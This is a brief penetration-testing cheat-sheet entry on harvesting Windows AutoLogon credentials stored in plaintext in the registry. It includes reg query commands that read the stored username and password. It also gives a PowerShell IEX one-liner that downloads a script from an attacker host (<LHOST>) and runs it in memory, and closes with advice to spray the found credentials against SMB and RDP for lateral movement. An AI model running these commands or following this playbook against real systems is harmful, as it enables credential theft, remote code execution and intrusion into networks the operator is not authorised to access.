# WinLogon AutoLogon Credentials

Windows AutoLogon stores credentials in plaintext registry keys for automatic sign-in on boot. PrivescCheck and manual registry queries both surface this.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

Automated:
```powershell
# PrivescCheck.ps1 surfaces this in the "Credentials" section automatically
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PrivescCheck.ps1'); Invoke-PrivescCheck
```

Found credentials → try immediately for local admin, then spray against SMB/RDP for lateral movement.
